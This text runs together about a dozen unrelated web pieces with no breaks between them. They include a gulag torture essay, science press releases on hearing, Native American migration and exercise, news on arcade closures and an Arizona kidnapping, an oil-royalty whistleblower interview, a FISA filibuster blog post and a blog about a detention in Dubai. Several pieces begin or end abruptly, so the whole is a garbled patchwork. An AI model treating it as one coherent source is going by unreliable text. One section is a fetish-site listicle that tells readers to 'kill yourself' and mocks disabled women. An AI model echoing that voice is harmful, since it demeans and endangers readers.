To extract a confession , her interrogators used pliers to rip the flesh from the inside of her upper arms .
I do n’t know what she told them .
She was , after all , just a woman who loved books .
Regardless , she was convicted and condemned to death .
After languishing for months in a death cell waiting to be executed , her sentence was commuted to fifteen years in a Siberian gulag .
She did not see her husband or her children for a quarter of a century .
Her torture did not begin or end with the pliers — a Stalin - era “ enhanced interrogation technique . ”
The scars from the pliers were visible on her arms , which she hid under long sleeves .
The scars of twenty - five years were visible in her eyes , which she hid in books for the remainder of her life .
A society that accommodates itself to the idea of torture , be it torture of minutes or hours or months or years , forfeits the right to think of itself as moral or humane .
That nation is not the beacon light of liberty and justice shining on less enlightened countries .
It is the umbra .
Newswise —
The human ear is exquisitely tuned to discern different sound frequencies , whether such tones are high or low , near or far .
But the ability of our ears pales in comparison to the remarkable knack of single neurons in the brain to distinguish between the very subtlest of sound frequencies .
Reporting in the January 10 issue of the journal Nature , Dr. Itzhak Fried , a professor of neurosurgery and director of the epilepsy surgery program , and colleagues at the Hebrew University in Jerusalem and the Weizmann Institute of Science , show that in humans , a single auditory neuron in the brain exhibits an amazing selectivity to a very narrow sound frequency range , roughly down to a tenth of an octave .
In fact , the ability of these neurons to detect the slightest of differences in sound frequencies far exceeds that of the auditory nerve that carries information from the hair cells of the inner ear to the cortex as much as 30 times more sensitivity .
Indeed , such frequency tuning in the human auditory cortex is substantially superior to that typically found in the auditory cortex of non-human mammals , with the exception of bats .
It is quite a paradox , the researchers note , in that even musically untrained people can detect very small sound frequency differences , much better than the resolution of the peripheral auditory nerves .
This is very different from other peripheral nerves , such as those in the skin , where the human ability to detect differences between two points ( say from the prick of a needle ) is limited by the receptors in the skin .
Not so in hearing .
The researchers , including senior author Israel Nelken and first author Yael Bitterman from the Hebrew University , determined how neurons in the human auditory cortex responded to various sounds by taking recordings from four consenting clinical patients at the UCLA Medical Center .
These patients had intractable epilepsy , and were being monitored with intracranial depth electrodes to identify the focal point of their seizures for potential surgical treatment .
Using clinical criteria , electrodes were implanted bilaterally at various brain sites that were suspected to be involved in the seizures ; these included the auditory cortex .
The recording of brain activity was carried out while the patients listened to artificial random chords at different tones per octave , and to segments from the film " The Good , the Bad and the Ugly . ''
Thus , the sounds the patients heard were both artificial — the random chords — and more natural , the voices and noise from the movie soundtrack .
The results surprised the researchers .
A single auditory neuron from humans showed an amazing sensitivity to distinguish between very subtle frequency differences , down to a tenth of an octave .
This compared to a sensitivity of about one octave in the cat , about a third of an octave on average in rats , and half to one octave in the macaque .
" This is remarkable selectivity , " said Fried , who is also the co-director of UCLA 's Seizure Disorder Center .
" It is indeed a mystery why such resolution in humans came to be .
Why did we develop this ?
Such selectivity is not needed for speech comprehension , but it may have a role in musical skill .
The three percent frequency differences that can be detected by single neurons may explain the fact that even musically untrained people can detect such frequency differences .
" There is also evidence that frequency discrimination in humans correlates with various cognitive skills , including working memory and the capability to learn , but more research is needed to clarify this puzzle . "
This study , said Fried , is the latest example of the power of neurobiological research that uses data drawn directly from inside a living human brain at the single - neuron level .
Previous studies from Fried 's lab have identified single cells in the human hippocampus specific to places during human navigation , and single cells that can translate varied visual images of the same item , such as the identity of an individual , into a single instantly and consistently recognizable concept .

Wii game console may be a major headache for main rivals like Sony Corp 6758.T , but for operators of game arcades the pain is proving just as , if not more , intense .
In a shock downward revision to its earnings outlook , toy and amusement arcade firm Namco Bandai Holdings 7832 .
T said it would close between 50 and 60 , or roughly one - fifth of its arcades , causing its shares to plummet for a second consecutive session on Thursday .
“ A lot of the types of games that people played at an arcade can now be done at home , ” company spokesman Yuji Machida said .
The Wii , which has gained worldwide popularity , offers an innovative motion - sensing controller that can be swung like a bat or sword .
The addition of “ Wii Fit ” , which features a pressure sensing board that players can use to simulate ski jumps or surfing , has also propelled sales .
Many Japanese kids got a Wii last year , particularly over the holiday season , and it seems as if much of their pocket money is now being saved to buy more hardware or software for the console , Machida said .
Sky - high oil prices have also done their damage , as Japanese families , eager to save on gasoline , cut back on trips to big shopping malls where many of the company ’s family - oriented arcades are located , he added .
Namco Bandai is the second arcade operator to announce a major overhaul .
Sega Sammy Holdings 6460 .T also plans to close around 100 of its arcades .
Namco Bandai , perhaps best known for its virtual pet toy Tamagotchi , slashed its full - year net profit outlook by 38 percent from an earlier estimate to 16.5 billion yen ( $ 155 million ) .
Its shares were down by their daily limit again Thursday afternoon at 1,095 yen , set to put in a 27 percent slide since Tuesday ’s close .
Sega Sammy shares were down 5.0 percent at 1,102 yen .

Cops Seek Pinup Girl - Law Student 's Accomplices Brothers wanted in Miss Arizona contestant 's kidnapping may have fled the U.S .
Jan. 2 , 2008  --
Two brothers who helped a former beauty queen - turned - law student kidnap and torture an ex-boyfriend may have fled the country to Colombia , Arizona authorities told ABC News .
Authorities have an arrest warrant for Micheal and Robert Ergonis , 44 and 46 respectively , in connection with a Dec. 8 kidnap and assault in which a former boyfriend of pinup girl Kumari Fulbright was tied up with cable and duct tape and threatened with knives and guns in two different houses during a 10 - hour span .
" They 're still on the run , " Tucson Police Department spokesman Sgt. Fabian Pacheco told ABC News .
" We have reason to believe they have international ties . "
Fulbright , a 25 - year - old former Miss Arizona contestant , had reportedly served as a law clerk for U.S. District Judge Raner Collins while she attended the University of Arizona 's law school .
She is listed as a member of the editorial board of the campus law journal , according to the Arizona Daily Star .
Fulbright has been indicted on five felony charges , including armed robbery , aggravated robbery , kidnapping and two counts of aggravated assault with a deadly weapon .
Fulbright was released from jail after posting a $ 50,000 bond .
Pacheco laid out a timetable of events that began Dec. 8 when Fulbright asked a former boyfriend to come to her Tucson apartment .
Fulbright said she was going to take a shower , Pacheco said , when the Ergonis brothers entered the residence armed with handguns .
Robert Ergonis was identified by police as another former boyfriend of Fulbright's .
" With guns , they tell him get down on the floor , " Pacheco said .
" They begin to accuse this victim of stealing some jewelry , according to Fulbright .
She comes out of the shower and she begins to participate in this whole incident . "
The Ergonises then placed the victim in a sport utility vehicle and transported him to another home in Tucson , where a third man , 40 - year - old Larry Bruce Hammond , allegedly became involved .
" There were some tools .
The victim sees these tools and he thinks they 're going to use them on him , " Pacheco said .
" He honestly thinks he is going to get killed . "
The victim told investigators the three men involved then left the apartment , Pacheco said , instructing Fulbright to " watch " the victim with a handgun .
By this point , the victim had freed one of his hands and when she approached , he managed to grab the gun from her hand .
The weapon reportedly discharged .
" They began to fight over the gun and the victim managed to get out of this apartment , " Pacheco said , adding that a neighbor called police after hearing screams as the man ran from the house .
The call came into police at 10:50 p.m. , about 10 hours after the victim had originally shown up at Fulbright 's apartment .
Prosecutors in Pima County , Ariz. , cite Fulbright in the indictment documents .
" [ Fulbright ] specifically bit him several times while he was bound , stuck a butcher knife in his ear … said she was going to kill him [ and ] pointed a pistol at him . "
The documents , which were obtained by the Arizona Daily Star newspaper , accuse Fulbright and the three men of taking the victim 's wallet , cell phone , briefcase and hundreds of dollars in cash .
At one of the two houses , according to search warrant documents filed in court , police recovered a spent bullet , as well as .45 - caliber ammunition , plastic gloves , marijuana and the victim 's wallet and briefcase .
At the other house , authorities recovered duct tape .
Tom Hartzell , Fulbright 's attorney , did not respond to a message left Tuesday by ABC News , but suggested to the Arizona Daily Star that the ex-boyfriend 's criminal history may compromise his credibility as a witness .
" We 're eager to see the process through , and for the truth of this matter to come to light , " Hartzell said .
" My preliminary investigation indicates the alleged victim is not the most savory individual , and will be coming to court with a whole lot of baggage of his own . "
The victim , who has not been named by authorities , was charged with assault and disorderly conduct in March ; those charges were reportedly dismissed last month after he completed a court - sanctioned program .
It is the policy of the Tucson Police Department not to name the victims of violent crimes , Pacheco said .
" If they 're listed as a victim , we do n't release any of their information , " he said .
" We can't really talk about what the victim may or may not have been involved in with the law . "
But Pacheco also said that the victim 's injuries were consistent with a kidnapping .
Fulbright will appear in a 2008 calendar for Subguns.com that features women in bikinis brandishing firearms .
Fulbright is Miss May , according to Jeff Hawley , a founder of Title2 Media , the company that produced the calendar for Subguns .
In her photograph , Fulbright is pictured carrying an HK 51 machine gun .
" We were really shocked to see the story , " Hawley told ABC News .
" She was a very nice individual ; she had modeled professionally . "
Like Fulbright , Hammond was arrested in the days after the abduction .
He was charged with the same crimes and remains held on $ 50,000 bond .
Crude Awakening This Week : Crude Awakening | Whistleblower : A Former Government Employee Speaks Out | FAQ : Oil and Gas Royalty Relief | Essay : Trivializing Corruption | Transcript
Gambrell was fired in 2003 .
He reportedly said the Interior Department told him it was because he destroyed records .
Gambrell sued for wrongful termination and said he and the department have reached a confidential settlement .
NOW contacted the Department of Interior to discuss Gambrell 's allegations , which they deny , but they turned down our request for an interview .
This is an edited transcript of our interview with Gambrell .
MARIA HINOJOSA : Can you explain what you did for the office ?
KEVIN GAMBRELL : My job was to manage Indian allotments in the Four Corners [ area of the American Southwest ] to make sure that the Indian people were getting what they were entitled to , royalties .
HINOJOSA : How did you see your role in the greater scheme of working on behalf of the American taxpayer ?
GAMBRELL : ... I had the responsibility to make sure that the companies pay correctly and that the taxpayers get everything that they 're entitled to .
HINOJOSA : Did you witness a time when the oil companies were not trying to pay their royalties ?
GAMBRELL : Oh many times .
I think oil and gas companies were always trying to figure out how to not pay royalties or to pay as little as possible .
HINOJOSA : How much do you think that the American taxpayer is losing from your understanding of what oil companies are not paying in terms of their royalties ?
GAMBRELL : I think the American taxpayers are losing billions of dollars .
HINOJOSA : How did they do it ?
GAMBRELL :
They would take deductions that they could not legally take .
They would price their oil to gas using artificial pricing mechanisms that were n't true to the market .
They would get bonuses , premiums and other considerations that were not visible to the royalty collectors ...
HINOJOSA : How easy is it for an oil or gas company to essentially underreport the royalties that are due ?
GAMBRELL : It 's easy ...
In the past it was much easier ... I had an example probably three years ago where an oil and gas company was producing oil and gas from a well site and they never reported anything to the federal government .
And I found out through a transporter that transports oil and gas that they had been producing .
There was no way to really know that they were paying correctly until we 've got the third party verification .
HINOJOSA : Is this a systemic problem ?
Is it all of the oil and gas companies that are trying to get out of paying royalties or is it just a few bad companies ?
GAMBRELL : I would never say that all oil and gas companies are trying to get away without paying royalties ...
I would say that it 's more that oil and gas companies are underpaying royalties , probably a majority of them .
And there are some that actually do pay correctly , but most of them do n't .
HINOJOSA : So are Americans then to walk away [ knowing ] the oil and gas companies are purposely trying to take advantage of the American taxpayer ?
GAMBRELL : I do n't think the American people should walk away from this .
I think they need to really question the government that is currently auditing oil and gas royalties and make sure that they do it correctly .
I think there needs to be independent review , I mean separate from the government , a review of the agencies that collect royalties , manage the oil and gas properties .
There needs to be better oversight and there needs to be independent audits of these agencies .
HINOJOSA : With respect to your job collecting royalties from the oil companies , did things change at all when the Bush administration came into power ?
GAMBRELL : There was a specific mandate to the executive level people within the government to push oil and gas , to get oil and gas development domestically everywhere .
And it became a priority over everything else .
It was almost like a tunnel vision .
The issues that were being dealt with under the Clinton administration had just basically been pushed to the side and things like Indian Trust became secondary to oil and gas .
And oil and gas just became the priority .
And if it meant jeopardizing the health and safety of people , such as Indian people , it was secondary .
It was almost ignored .
It became just a low priority , and oil and gas became the priority ...
I think that when the Bush administration came into power it changed our way of taking care of a lot of the audits .
It became a priority to get rid of the legacy audits -- audits that had been pending or had not been completed from many years .
And our focus became solely on getting the past cleaned up and getting a situation where oil and gas could pay the royalties without a lot of complications .
And Minerals Management Service ( MMS ) could do the compliance work without a lot of work involved and the detail that it required in the past .
HINOJOSA : What did your superiors say when you wanted to push to make sure that the oil companies were paying the royalties that were due ?
GAMBRELL : During the time that I was trying to push to get oil and gas companies to pay correctly , there were a lot of changes in the way that management thought that we should take care of the past audits .
They try to push a lot of short cuts in doing the audit process .
In fact it became ... no longer an audit process .
It became almost a review , a simple review and there was n't really any audit any longer .
Just pretty much ignore the audit process .
And the collection of royalties , from my experience , I was able to collect eight times the amount of royalty in terms of back - paid dollars than what the new process that the management had bantied ( SIC ) up for me to do .
HINOJOSA : And do you believe that MMS was in fact working the hardest they possibly could to collect the royalties from the oil and gas companies ?
GAMBRELL : No I do not .
I think if you go back to a 2003 report by the Inspector General [ 2MB - Requires Adobe Reader ] , that reviews some of MMS 's work , they found that there was I think out of 14 audits that [ 10 ] audits were substandard or not done correctly ...
HINOJOSA : When you would realize that perhaps a company was underreporting , when you were auditing and you wanted to push forward to get this company to kind of step forward and explain the problems with their paperwork .
What happened ?
GAMBRELL : I got a lot of resistance .
I 've had companies basically divert the issue to my authority and question what authority I have to go after them for a particular issue .
I had them telling me in court .
They often bring in their attorneys .
I mean there 's never been a situation that they did n't bring in their attorneys .
They try to negotiate .
Since it 's very difficult they 'll sometimes contact a congressman and have their congressman contact me or contact my supervisor and try to circumvent me .
That 's happened many times ...
... sometimes I would get a call from my boss , who was talking to that oil and gas company , that oil and gas executive would contact my boss .
And my boss would call me and say , " What are you doing ?
Why are you doing this ?
We do n't want you pushing this issue on this oil and gas company . "
HINOJOSA : When you witnessed that happening to you , what went on for you ?
GAMBRELL : I was shocked ... I thought industry would fess up to the mistakes and pay correctly .
I did n't think they would do something underhanded like contacting their congressman to ... hit me from basically from the side .
I thought they would be direct with me and try to work with me .
I think after they realized that I was n't really responsive to Congress in the sense that I would actually change my decision I think they then realized that they would have to you know work with me .
I mean they did take a lot of putting the pressure on them to pay correctly .
HINOJOSA : Did you go speak to your superiors ?
GAMBRELL : I spoke to my superiors .
I sent memos .
I contacted the courts in [ Washington ] D.C. ... and explained to them some of the problems I was having .
And I felt that no matter what I said , no matter how much I was able to provide documentation to support my conclusions that we were going to damage the taxpayer 's interest , they continued to push that .
They continued to push that directive .
And when I was n't willing to participate I felt that I was retaliated against .
All of a sudden I became like the bad guy .
Who was I to question the management ? ... the objective was to remove me from government once I started refusing to ... violate the collection of royalties for taxpayers .
HINOJOSA : And how would you grade the governmental organization , the MMS , in charge of collecting those royalties ?
GAMBRELL : I would actually probably give them an F .
I think they fail in their duties to protect the taxpayers .
HINOJOSA : Do you believe that oil and gas companies are lying sometimes to avoid paying royalties ?
GAMBRELL : I think some oil and gas companies do lie in order not to pay royalties .
I think in the past , I know in the past that , if you look at a lot of the things that they did , they did lie .
You could n't trust the oil and gas companies to do what was right .
HINOJOSA : From somebody who 's been on the inside , who knows how the agencies and the oil and gas industries work , what 's the solution when the American taxpayer says , " What are we supposed to do ? "
GAMBRELL : I think a lot of the solution is to have a person who manages these agencies that collect royalty that is independent of oil and gas , that has nothing to do with oil and gas , has been a person who understands regulation and how to protect the taxpayer .
I think what we have now is a lot of people who understand profit .
And they understand money .
And they understand oil and gas influence .
But they do n't understand the responsibility to the taxpayer .
Questions about human migration from Asia to the Americas have perplexed anthropologists for decades , but as scenarios about the peopling of the New World come and go , the big questions have remained .
Do the ancestors of Native Americans derive from only a small number of “ founders ” who trekked to the Americas via the Bering land bridge ?
How did their migration to the New World proceed ?
What , if anything , did the climate have to do with their migration ?
And what took them so long ?
A team of 21 researchers , led by Ripan Malhi , a geneticist in the department of anthropology at the University of Illinois , has a new set of ideas .
One is a striking hypothesis that seems to map the peopling process during the pioneering phase and well beyond , and at the same time show that there was much more genetic diversity in the founder population than was previously thought .
“ Our phylogeographic analysis of a new mitochondrial genome dataset allows us to draw several conclusions , ” the authors wrote .
“ First , before spreading across the Americas , the ancestral population paused in Beringia long enough for specific mutations to accumulate that separate the New World founder lineages from their Asian sister - clades . ”
( A clade is a group of mitochondrial DNAs ( mtDNAs ) that share a recent common ancestor , Malhi said .
Sister - clades would include two groups of mtDNAs that each share a recent common ancestor and the common ancestor for each clade is closely related . )
Or , to express this first conclusion another way , the ancestors of Native Americans who first left Siberia for greener pastures perhaps as much as 30,000 years ago , came to a standstill on Beringia – a landmass that existed during the last glacial maximum that extended from Northeastern Siberia to Western Alaska , including the Bering land bridge – and they were isolated there long enough – as much as 15,000 years – to maturate and differentiate themselves genetically from their Asian sisters .
“ Second , founding haplotypes or lineages are uniformly distributed across North and South America instead of exhibiting a nested structure from north to south .
Thus , after the Beringian standstill , the initial North to South migration was likely a swift pioneering process , not a gradual diffusion . ”
The DNA data also suggest a lot more to -ing and fro-ing than has been suspected of populations during the past 30,000 years in Northeast Asia and North America .
The analysis of the dataset shows that after the initial peopling of Beringia , there were a series of back migrations to Northeast Asia as well as forward migrations to the Americas from Beringia , thus “ more recent bi-directional gene flow between Siberia and the North American Arctic . ”

To investigate the pioneering phase in the Americas , Malhi and his team , a group of geneticists from around the world , pooled their genomic datasets and then analyzed 623 complete mitochondrial DNAs ( mtDNAs ) from the Americas and Asia , including 20 new complete mtDNAs from the Americas and seven from Asia .
The sequence data was used to direct high - resolution genotyping from 20 American and 26 Asian populations .
Mitochondrial DNA , that is , DNA found in organelles , rather than in the cell nucleus , is considered to be of separate evolutionary origin , and is inherited from only one parent – the female .
The team identified three new sub-clades that incorporate nearly all of Native American haplogroup C mtDNAs – all of them widely distributed in the New World , but absent in Asia ; and they defined two additional founder groups , “ which differ by several mutations from the Asian - derived ancestral clades . ”
What puzzled them originally was the disconnect between recent archaeological datings .
New evidence places Homo sapiens at the Yana Rhinoceros Horn Site in Siberia – as likely a departure point for the migrants as any in the region – as early as 30,000 years before the present , but the earliest archaeological site at the southern end of South America is dated to only 15,000 years ago .
“ These archaeological dates suggested two likely scenarios , ” the authors wrote : Either the ancestors of Native Americans peopled Beringia before the Last Glacial Maximum , but remained locally isolated – likely because of ecological barriers – until entering the Americas 15,000 years before the present ( the Beringian incubation model , BIM ) ; or the ancestors of Native Americans did not reach Beringia until just before 15,000 years before the present , and then moved continuously on into the Americas , being recently derived from a larger parent Asian population ( direct colonization model , DCM ) .
Thus , for this study the team set out to test the two hypotheses : one , that Native Americans ’ ancestors moved directly from Northeast Asia to the Americas ; the other , that Native American ancestors were isolated from other Northeast Asian populations for a significant period of time before moving rapidly into the Americas all the way down to Tierra del Fuego .
“ Our data supports the second hypothesis :
The ancestors of Native Americans peopled Beringia before the Last Glacial Maximum , but remained locally isolated until entering the Americas at 15,000 years before the present . ”
The team ’s findings appear in a recent issue of the Public Library of Science in an article titled , “ Beringian Standstill and Spread of Native American Founders . ”
from The West Wing -- The Stackhouse Filibuster
Senate Majority Leader Harry Reid loves parliamentary procedure so much that he is essentially selling out his own party to allow the Senate to debate the FISA bill with the telecom immunity .
As Glenn spells out :
The summarized version is that there were two competing bills which Reid could have brought to the floor -- the Senate Intelligence Committee version engineered by Jay Rockefeller and Dick Cheney which gives the administration most of what it wants , and the Senate Judiciary Committee , which does not contain telecom amnesty and contains far more extensive oversight protections .
Reid could have brought the bill to the floor using whatever process he wanted , and he has decided -- contrary to weeks of assurances -- that the SIC bill will serve as the " base " bill , meaning that improving it ( by removing amnesty and increasing oversight ) will require 60 votes , rendering such efforts virtually impossible .
In doing so , Reid is brazenly ignoring the demands of 14 Senators -- including all of the Democratic presidential candidates -- to have the Judiciary Committee bill be the base bill .
Worse still , Reid is completely disregarding the " hold " placed by Chris Dodd on any amnesty bill -- simply refusing to honor it , even as he respectfully honors literally scores of " holds " from GOP Senators such as Tom Coburn .
And while Dodd is interrupting his campaigning to fly to Washington to lead the filibuster he vowed , Reid has ensured with scheduling manuevers that the filibuster will take place only over the weekend -- when all of the members are away raising money anyway and journalists are n't paying attention -- with the intent to try to force cloture once everyone returns on Monday .
So if that 's the way Harry Reid wants to play it , Chris Dodd is going to use parliamentary procedure as well -- to filibuster the SIC version of the bill .
Thank the deity of your choice for a Democrat who not only represents Democratic values , but also acts like an opposition party leader .
I do n't mean you , Harry .
And like the The West Wing clip above , Senators Feingold and Kennedy have promised to help by asking questions , to give Dodd a chance to rest or have a bite .
But Dodd needs things to say while filibustering on the Senate floor .
Shall he read the complete works of Shakespeare ?
George Orwell 's 1984 ?
Every time I see Karl Rove 's face , I can't help but think of Animal Farm , myself .
Or perhaps Shock Doctrine ?
How about the transcripts to one of Olbermann 's Special Comments ?
All good choices .
But how about if Chris Dodd speaks for the American public as well ?
After 7 long years of feeling left out of the political discussion , there are many things I 'd love to have a Senator say out loud on the Senate floor .
I 've been communicating with his office and they have authorized me to put out this invitation to you , as well as readers of FDL and other blogs .
What would you like to hear Senator Chris Dodd say as part of his filibuster ?
I am going to sticky this post at the top of the page today to get as many responses as possible .
Obviously , we 're making no guarantees other than his office will definitely be looking at your posts .
Normal commenting policies still apply .
And Senator Dodd ?
Thank you , thank you , thank you .
Sedentary people who regularly complain of fatigue can increase their energy levels by 20 percent and decrease their fatigue by 65 percent by engaging in regular , low intensity exercise , according to a new University of Georgia study .
“ Too often we believe that a quick workout will leave us worn out – especially when we are already feeling fatigued , ” said researcher Tim Puetz , who recently completed his doctorate at UGA and is the lead author of the study .
“ However , we have shown that regular exercise can actually go a long way in increasing feelings of energy – particularly in sedentary individuals . ”
Puetz co-authored the study with professor Patrick O’Connor , co-director of the UGA Exercise Psychology Laboratory , and former UGA student Sara Flowers . *
O’Connor said previous studies – including one that he and Puetz co-authored in 2006 – have shown that exercise can significantly improve energy levels and decrease fatigue .
Those studies , however , primarily looked at patients with medical conditions such as cancer , heart disease and mental health problems .
In this latest study , the researchers studied volunteers who had fatigue that was persistent yet did n’t meet the criteria for a medical condition such as chronic fatigue syndrome .
O’Connor said about 25 percent of the general population experiences such fatigue .
“ A lot of people are overworked and not sleeping enough , ” O’Connor said .
“ Exercise is a way for people to feel more energetic .
There ’s a scientific basis for it , and there are advantages to it compared to things like caffeine and energy drinks . ”
The researchers recruited 36 volunteers who did not exercise regularly and had reported persistent fatigue based on a commonly used health survey .
The volunteers were divided into three groups :
The first engaged in 20 minutes of moderate - intensity aerobic exercise three times a week for six weeks ; the second engaged in low - intensity aerobic exercise for the same time period ; the control group did not exercise .

The low - and moderate - intensity groups had a 20 percent increase in energy levels over the control group .
Surprisingly , the low - intensity group had a greater reduction in fatigue levels than the moderate - intensity group , 65 percent compared to 49 percent , respectively .
“ It could be that moderate - intensity exercise is too much for people who are already fatigued , ” O’Connor said , “ and that might contribute to them not getting as great an improvement as they would had they done the low - intensity exercise . ”
He adds that energy and fatigue are n’t exactly opposites of each other .
A student who stays up late to finish a term paper may feel fatigued , for example , but may also feel energized as she nears the end of the paper .
The volunteers in the study used exercise bikes that allowed the researchers to control their level of exertion so that low - intensity exercise was defined as 40 percent of their peak oxygen consumption and moderate - intensity exercise was defined as 75 percent of peak oxygen consumption .
For comparison , O’Connor said a leisurely , easy walk is low - intensity exercise , while a fast - paced walk with hills is moderate - intensity exercise .
The team ’s analysis also found that the improvements in energy and fatigue were not related to increases in aerobic fitness that the exercisers experienced .
Puetz said the finding suggests that exercise acts directly on the central nervous system to increase energy and reduce fatigue .
“ Exercise traditionally has been associated with physical health , but we are quickly learning that exercise has a more holistic effect on the human body and includes effects on psychological health , ” Puetz said .
“ What this means is that in every workout a single step is not just a step closer to a healthier body , but also to a healthier mind . ”
* The team ’s results appear in the February issue of the journal Psychotherapy and Psychosomatics .

Hands on Her Hips
Hands on Hips proves Freud right .
There 's no other way to explain the presence of a fetish site devoted entirely to women posing with their hands on their hips , standing defiantly and angrily in the way so many mothers do when their children misbehave .
Somewhere , deep in the psyche of the site 's creator , he desperately wants to find and have sex with a mother figure who will discipline him with nothing harsher than a Time Out and denial of television .
I guess this fetish is for people who are n't quite into sadomasochistic discipline , but think they might one day be .
Bondage training wheels , if you will .
Damsels in Distress
If you played through the original Super Mario Bros and found yourself with a raging boner once you finally found Princess Peach , then Olde Worlde Damsels is for you .
Olde Worlde Damsels is also for you , evidently , if you 're really into confusing and inexplicable speech bubbles Photoshopped into pictures of the aforementioned damsels .
Honestly , I can sort of understand what would compel a human being to poorly Photoshop gags and restricting rope around his favorite celebrities ( it sort of functions as a mixture of bondage fetishism and superhero fantasy , I guess ) , but why accompany the pictures with totally nonsensical quotes like , " I feel like a licorice allsport ! "
Is the site trying to be funny , or just intentionally make its weirdass fetish even weirder ?
If you 're aiming for the latter , then congrats , guys : mission accomplished .
Paraplegic Climbing Stairs
I could make a joke here .
However , the fact that someone finds paraplegic girls attempting to climb flights of stairs sexually arousing is so deranged , so depraved , that I have to wonder just why they find it so fascinating .
Best case scenario , these fetishists find something intriguing , inspiring , and subsequently arousing in a paraplegic 's power to overcome her disability and function in the same way " abled " people are .
She 's overcoming a hardship , which empowers her and makes her a figure of respect and eroticism .
I kinda doubt that 's why people jerk off to this , though .
Much more likely , and much more terrifyingly , is the possibility that PCS enthusiasts get off on seeing a handicapped woman struggle .
They do n't get off on seeing her succeed in climbing the stairs ( which probably accounts for why she does n't actually make it all the way up ) ; they just like watching her try , and fail , to make it up each step .
These guys get the same sort of enjoyment that sadistic preschool kids get when they turn a tortoise onto its back and watch it helplessly flail its legs in the air , powerless to regain control of its body .
Sick fucks .
Pedal Pushing
Does the image of not particularly - attractive men and women repeatedly pumping their gas pedals make you salivate with horniness ?
If so , kill yourself .
I literally cannot begin to fathom what subconscious sexual desire this fetish satisfies : I mean , there 's something sort of handjobby in the image of a limb repeatedly pumping up and down for five minutes , but christ -- if you want to see someone get jerked off by a woman 's feet , you can find that pretty easily .
Does something about automotive trouble in particular get these guys hard ?
Do they intentionally attack parts of their engine with a wrench just so they can masturbate when their transmission malfunctions ?
Trampling
TrampleCity is evidently for guys who have such an inferiority complex that they can get off on other men being trampled on .
Keep in mind that this site does n't deal with sadistic domination ( you know , the sort of thing most quasi - normal sexual deviants are into ) , but rather the very specific fetish of men getting their friggin ' faces stepped on .
I honestly can't imagine anyone finding this fetish erotic unless they truly , completely hated themselves .
They despise themselves so much , and have such bad luck with women , that they can more easily relate to the image of a man 's face getting squished by a woman 's boot than the two having sex .
That , or there 's no explanation and they 're just plain fucking weird .
Sneezing Babes
SneezingBabes knows that nothing is sexier than a woman who 's about to unleash a torrent of mucus and saliva in your general direction .
I 'm tempted to say that 's the only thing they know , considering how poorly designed their website is , and how hilariously non-sexual their fetish of choice happens to be .
Can you begin to imagine how these guys function in real life ?
Do they carry boxes of pepper to restaurants , discreetly sprinkling them in the food or napkins of nearby women ?
Do they get off on their own sneezing ?
In that case , do they ever leave the house ?
We 've all heard the urban legend that sneezing is like experiencing one tenth of an orgasm -- given the fact that SneezingBabes subscribers are having real orgasms in addition to the dozens of sneezes they presumably put themselves through , it 's probably fair to say that the average sneeze fetishist has at least 7000 orgasms a day .
Nylon Jackets
Thankfully , this nylon jacket fetish site actually includes some " normal " porn -- that is to say , men and women having sex with each other .
Granted , they 're all inexplicably wearing nylon jackets , but we take what we can get here at DoubleViking.com .
In a way , nylon jacket porn could almost be considered one big piece of pornographic Happy Days fan fiction : chicks and dudes who wanted to screw the Fonz , but never got the ability to see Henry Winkler 's junk in person , must vicariously re-enact their innermost Fonzarelli fantasies and post them on the Internet .
If a single one of the models on that site does n't yell " AAAAAAAAAYYYYYYY ! " when reaching climax , I 'll be extremely surprised .
Dude w/ leg choke fetish
I bet this guy really loves Goldeneye .
Crushing My Dinner
The " Crushing my Dinner " fetish consists of two steps :
1. Woman makes dinner .
2. Woman steps on dinner .
Okay , whatever : I can write off the crushing thing as an extension of foot fetishism .
Fine .
Great .
But why , I must ask , why the fuck would anyone specifically get off on seeing someone prepare food , and then destroy it ?
Do you just hate food ?
What did food ever do to you ?
And hell , that girl took quite a long time to prepare that for you -- forcing her to squish it between her toes after she 's finished cooking it just seems like a darn waste of time and effort .
Gut Flopping
I...no .
Words fail me .
From the Tower lab , a comprehensive gene expression profile of flies that conditionally overexpress the antioxidant enzyme MnSOD .
Based on the inverse relationship between genes regulated by MnSOD and those regulated by aging , the authors argue that their flies are experiencing a bona fide delay in the natural aging process .
Furthermore , based on results in the worm , the authors conclude that gene regulation by aging is conserved across broad evolutionary distances .

I got the following e-mail / images last night - thought ya'll might wanna see ...
Hi , My name 's Dave .. I work at a video store here in jersey , and we just got our shipment of Farenheit 9/11 DVD 's ( this was like 4 days ago ) .
Read the rest of this entry »
So here is what is happening with Diz , my partner .
I waited to go public with this because I wanted to preserve his privacy , and thank you for understanding the cryptic nature of my communication lately .
On Saturday morning Diz flew into Dubai airport and was detained at immigration .
We kind of knew he would be profiled because he has long hair and looks oriental ( they are very racist against Asians in Dubai , and ultra- conservative ) .
He knew the score going in : prescription drugs are illegal , dress conservatively and detox for a week ( even trace amounts of either illegal or prescription drugs in the urine are prosecuted as ' drug smuggling ' .
I 'm not joking ) .
They found melatonin on him , which he bought over the counter in the US .
Legally , you can even buy it over the counter in Dubai .
They arrested him , anyway .
He was strip searched , forced to do a urine test and thrown in jail .
In their search they dug into the bottom of his bag and came up with a few fragments of dirt , which they allege is hashish , which is totally outrageous .
They also claimed that the melatonin was actually drugs , which was equally , clearly absurd .
The sentence if convicted is a blanket four years , with a minimum of six months in prison in one of Dubai 's squalid , third world facilities .
After detaining him for three days , the melatonin was determined to be just that , and his urine was clear .
Now they 've asked for a seven day extension to test the dirt , and we trust that he will be on his way home after that .
They 've been psychologically abusing all of us .
One minute we 're told they 'll let him go as soon as they test the pills , the next we 're told they are going through and pressing charges against him .
Taking care of his affairs and keeping all of his close friends and relations , spanning four continents , up to date has been a full time job .
Nadya , myself and Scott ( his friend in Dubai : read his account here ) have been working around the clock , ready to wage a campaign for his freedom in the event that he is charged .
Scotty and Nadya are both pretty much fucking angels .
I spoke to him for the first time today .
He rang me and answered my greeting with " Hello from the Dubai tourism board ! " , so rest assure he is in good spirits and taking all of this very well .
What can you do ?
He wants your emails and letters .
He 's bored as hell .
Send them to me at mildredvon at yahoo dot come and I 'll make sure they get to him .
He has n't been charged with anything as yet , so there 's not much we can do but wait .
In the event they decide to prosecute him we will wage a campaign for his release and we will need all the help we can get for it , but we 're keeping our fingers crossed for an acquittal and apology over the next seven days .
Obviously , we 're preparing for the worst .
We have no guarantee they 're not going to sentence him , and they 've been threatening us with this possibility every time the consulate tells us things are going well .
We 've begun the task of taking care of his affairs in London in case they hold him more than the ten days .
Things could always be a lot worse , and he 's being treated well and has so much love and support from all of you guys .
The moral of this story is , no one is safe :
